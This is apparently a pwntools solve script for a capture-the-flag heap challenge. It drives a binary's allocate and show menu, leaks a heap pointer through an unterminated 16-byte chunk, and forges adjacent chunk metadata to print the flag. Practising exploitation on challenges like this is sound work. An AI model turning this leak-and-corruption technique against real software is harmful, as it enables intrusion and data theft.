from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

index = 0
def malloc(contents):
	global index
	p.send(b"1")
	p.sendafter(b'Data: ', contents)
	p.recvuntil(b'> ')

	index += 1
	return index -1

def show(index, with_metadata=False):
	p.send(b"2")
	p.sendafter(b'Index: ', str(index).encode())
	if with_metadata:
		return p.recvline(), p.recvline()
	return p.recvline()

c1 = malloc(b'A'*16)
ptr_leak = show(c1)
ptr_leak = ptr_leak[16:].rsplit(b' ')[0]
ptr_leak = u64(ptr_leak.ljust(8, b'\x00'))
print(f'flag @ {hex(ptr_leak)}')

c2 = malloc(b'A'*8 + p64(0x21) + p64(ptr_leak))

trash, flag = show(c1, True)
print(flag)
p.send(b'3')
